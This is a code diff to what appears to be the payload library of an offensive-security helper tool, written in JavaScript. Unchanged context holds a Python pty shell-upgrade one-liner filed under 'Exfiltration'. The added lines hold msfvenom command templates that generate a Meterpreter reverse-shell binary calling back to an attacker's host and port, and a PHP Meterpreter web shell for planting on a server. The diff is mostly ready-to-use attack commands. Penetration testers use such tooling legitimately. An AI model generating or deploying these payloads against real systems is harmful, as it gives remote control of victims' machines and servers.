@@ -136,6 +136,35 @@ Load({
 	payload:'python -c \'import pty;pty.spawn("/bin/bash")\'',
 	category: "Exfiltration",
 })
+
+// ################### MSF Venom ###################
+
+Load({
+	title: "List Msfvenom payloads",
+	payload: "msfvenom -l",
+	category: "MSF Venom"
+})
+
+Load({
+	title: "Generate Metasploit Binary",
+	payload:'msfvenom -p <PROMPT (payload type)> LHOST=<LHOST (local host)> LPORT=<LPORT (local port)> -f <PROMPT (payload format)> > file',
+	category: "MSF Venom",
+	callback: function(bro){
+		question("What payload would you like to use? (ex: linux/x86/meterpreter/reverse_tcp)");
+		question("What format would you like to generate the payload in? (ex: elf, exe, macho)");
+		ask.some(questions, bro);
+	}
+})
+
+Load({
+	title: "Generate Metasploit PHP Web Shell",
+	payload:"msfvenom -p php/meterpreter/<PROMPT (payload type)> LHOST=<LHOST (local host)> LPORT=<LPORT (local port)> -f raw > shell.php",
+	category: "MSF Venom",
+	callback: function(bro){
+		question("What payload would you like to use? (ex: reverse_tcp, reverse_http, etc)");
+		ask.some(questions, bro);
+	}
+})
 //
 
 /*
